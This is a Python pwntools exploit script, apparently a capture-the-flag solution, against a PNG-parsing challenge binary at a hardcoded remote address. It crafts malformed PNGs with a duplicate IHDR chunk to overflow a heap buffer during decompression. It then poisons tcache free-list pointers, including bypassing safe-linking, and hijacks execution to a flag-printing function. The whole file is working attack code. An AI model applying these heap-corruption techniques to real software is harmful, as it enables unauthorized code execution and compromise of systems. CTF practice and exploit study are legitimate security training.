from pwn import *
#context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './chall'
HOST = '104.199.160.243'
PORT =  51914

elf = ELF(TARGET)
def start():
    if not args.R:
        print("local")
        return process(TARGET)
    else:
        print("remote")
        return remote(HOST, PORT)

def get_base_address(proc):
    lines = open("/proc/{}/maps".format(proc.pid), 'r').readlines()
    for line in lines :
        if TARGET[2:] in line.split('/')[-1] :
            break
    return int(line.split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

import binascii
import zlib

PNG_MAGIC  = 0xa1a0a0d474e5089
CHUNK_IHDR = 0x52444849
CHUNK_IDAT = 0x54414449
CHUNK_IEND = 0x444e4549

'''
typedef struct __attribute__ ((__packed__)) {
  unsigned int width;
  unsigned int height;
  unsigned char bit_depth;
  unsigned char color_type;
  unsigned char compression_method;
  unsigned char filter_method;
  unsigned char interlace_method;
} IHDRChunk;

typedef struct {
  unsigned short width;
  unsigned short height;
  void *data;
  z_stream zstream;
} PNGFile;
'''

r = start()

r.recvuntil(b'=')
heap = int(r.recvuntil(b'\n', True), 16) - 0x2a0


def add_png(width, height, data, pngsize = 0x78):
    ihdr = b''
    ihdr += p32(CHUNK_IHDR)
    ihdr += p32(width, endian='big')
    ihdr += p32(height, endian='big')
    ihdr += p8(8) # bit_depth
    ihdr += p8(0) # color_type
    ihdr += p8(0xff) # compress
    ihdr += p8(0) # filter_method
    ihdr += p8(0) # interlace_method

    idat = b''
    idat += p32(CHUNK_IDAT)
    idat += zlib.compress(data)

    iend = b''
    iend += p32(CHUNK_IEND)

    payload = b''
    payload += p64(PNG_MAGIC)

    payload += p32(len(ihdr)-4, endian='big')
    payload += ihdr
    payload += p32(binascii.crc32(ihdr), endian='big')

    payload += p32(len(idat)-4, endian='big')
    payload += idat
    payload += p32(binascii.crc32(idat), endian='big')

    payload += p32(len(iend)-4, endian='big')
    payload += iend
    payload += p32(binascii.crc32(iend), endian='big')
    payload = payload.ljust(pngsize, b'\x00')

    r.sendlineafter(b'> ', b'1')
    r.sendlineafter(b'png: ', str(len(payload)).encode())
    r.sendafter(b'png:\n', payload)
def overwrite(to_write, width=0x20, height=1, data=b'a', pngsize = 0x78):
    width2 = len(to_write)
    height2 = 1

    ihdr = b''
    ihdr += p32(CHUNK_IHDR)
    ihdr += p32(width, endian='big')
    ihdr += p32(height, endian='big')
    ihdr += p8(8) # bit_depth
    ihdr += p8(0) # color_type
    ihdr += p8(0xff) # compress
    ihdr += p8(0) # filter_method
    ihdr += p8(0) # interlace_method

    idat = b''
    idat += p32(CHUNK_IDAT)
    #idat += p16(width, endian='big')
    #idat += p16(height, endian='big')
    #idat += b'\x78\xda\xcb\x48\xcd\xc9\xc9\x67'
    #idat += zlib.compress(b'11111111222222223333333344444444555555556666666677777777')
    idat += zlib.compress(data)

    ihdr2 = b''
    ihdr2 += p32(CHUNK_IHDR)
    ihdr2 += p32(width2, endian='big')
    ihdr2 += p32(height2, endian='big')
    ihdr2 += p8(8) # bit_depth
    ihdr2 += p8(0) # color_type
    ihdr2 += p8(0xff) # compress
    ihdr2 += p8(0) # filter_method
    ihdr2 += p8(0) # interlace_method


    idat2 = b''
    idat2 += p32(CHUNK_IDAT)
    idat2 += zlib.compress(to_write)

    iend = b''
    iend += p32(CHUNK_IEND)

    payload = b''
    payload += p64(PNG_MAGIC)

    payload += p32(len(ihdr)-4, endian='big')
    payload += ihdr
    payload += p32(binascii.crc32(ihdr), endian='big')

    payload += p32(len(idat)-4, endian='big')
    payload += idat
    payload += p32(binascii.crc32(idat), endian='big')

    payload += p32(len(ihdr2)-4, endian='big')
    payload += ihdr2
    payload += p32(binascii.crc32(ihdr2), endian='big')

    payload += p32(len(idat2)-4, endian='big')
    payload += idat2
    payload += p32(binascii.crc32(idat2), endian='big')

    payload += p32(len(iend)-4, endian='big')
    payload += iend
    payload += p32(binascii.crc32(iend), endian='big')
    payload = payload.ljust(pngsize, b'\x00')

    r.sendlineafter(b'> ', b'1')
    r.sendlineafter(b'png: ', str(len(payload)).encode())
    r.sendafter(b'png:\n', payload)

def del_png(idx):
    r.sendlineafter(b'> ', b'2')
    r.sendlineafter(b'id: ', str(idx).encode())

#add_png(0x4,1,b'aaaa')

add_png(0x20,1,b'a'*0x10)
add_png(0x20,1,b'b'*0x10)
add_png(0x20,1,b'c'*0x10)
del_png(2)
del_png(1)
del_png(0)
if args.D:
    debug(r, [0x1e63])
#pause()

payload = b''
payload += b'1'*0x28
payload += flat(0x91, (heap+0x4a0) ^ ((heap+0x3e0) >> 12))
payload += b'2'*0x80
payload += flat(0x31, 0x405080 ^ ((heap+0x470) >> 12), 0xbeef)
payload += b'3'*0x18
payload += flat(0x91, (0) ^ ((heap+0x4a0) >> 12))
payload += b'4'*0xb0
payload += p64(0xb1)
payload = payload.ljust(0x1f0, b'\x00')

overwrite(payload)
#overwrite(b'\x00'*0x200)

add_png(0x20,1,b'A'*0x40)

r.sendlineafter(b'> ', b'1')
r.sendlineafter(b'png: ', str(0x28).encode())
#pause()
#r.sendlineafter(b'png:\n', flat(PNG_MAGIC,0x01000000, elf.sym.give_flag2+5, 0xdead,0x401140))
r.sendlineafter(b'png:\n', flat(PNG_MAGIC,0x01000000, elf.sym.give_flag2+5, 0xdead,0x401140))

r.interactive()
r.close()

